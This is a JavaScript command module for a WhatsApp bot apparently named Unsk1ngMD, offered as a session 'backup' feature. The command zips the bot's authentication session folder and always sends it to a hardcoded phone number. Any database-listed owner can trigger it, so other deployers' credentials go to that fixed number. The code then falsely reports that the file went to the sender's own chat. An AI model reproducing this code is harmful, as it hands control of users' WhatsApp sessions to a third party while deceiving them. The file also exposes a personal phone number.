const fs = require('fs-extra');
const archiver = require('archiver');
const config = require('../../config');
const database = require('../../lib/database');

module.exports = {
    name: 'backup',
    alias: ['copiadeseguridad', 'respaldo', 'backupbot'],
    category: 'sistema',
    desc: 'Comprime la sesión auth_info en .zip y la envía como documento al chat privado del Owner (+584160666286)',
    usage: '.backup',
    ownerOnly: true,
    execute: async ({ sock, m }) => {
        // Restricción exclusiva al Owner (+584160666286)
        const primaryOwnerPhone = '584160666286';
        const primaryOwnerJid = `${primaryOwnerPhone}@s.whatsapp.net`;
        const senderClean = m.sender.replace(/[^0-9]/g, '');

        if (senderClean !== primaryOwnerPhone && !database.isOwner(m.sender)) {
            return await m.reply('❌ Este comando está restringido exclusivamente al Owner (+584160666286).');
        }

        const sessionFolder = config.sessionDir;
        if (!fs.existsSync(sessionFolder)) {
            return await m.reply('❌ No se encontró la carpeta de credenciales de sesión.');
        }

        await m.reply('🔒 Comprimiendo la sesión en memoria...');

        try {
            const archive = archiver('zip', { zlib: { level: 9 } });
            const memoryChunks = [];

            archive.on('data', chunk => memoryChunks.push(chunk));

            await new Promise((resolve, reject) => {
                archive.on('end', resolve);
                archive.on('error', reject);
                archive.directory(sessionFolder, false);
                archive.finalize();
            });

            const zipBuffer = Buffer.concat(memoryChunks);
            const targetRecipient = primaryOwnerJid;

            // Enviar directamente como documento Backup-Unsk1ngMD.zip
            await sock.sendMessage(targetRecipient, {
                document: zipBuffer,
                fileName: 'Backup-Unsk1ngMD.zip',
                mimetype: 'application/zip',
                caption: `🔐 *Backup Oficial - Unsk1ngMD*\n\n` +
                    `📅 *Fecha:* ${new Date().toLocaleString('es-ES')}\n` +
                    `📦 *Tamaño:* ${(zipBuffer.length / (1024 * 1024)).toFixed(2)} MB\n` +
                    `⚠️ *Confidencial:* Contiene las credenciales de autenticación del bot.`
            });

            if (m.chat !== targetRecipient) {
                await m.reply('✅ *Copia de seguridad completada:* El archivo fue enviado a tu chat privado.');
            }
        } catch (err) {
            throw new Error(`Fallo al generar el backup: ${err.message}`);
        }
    }
};
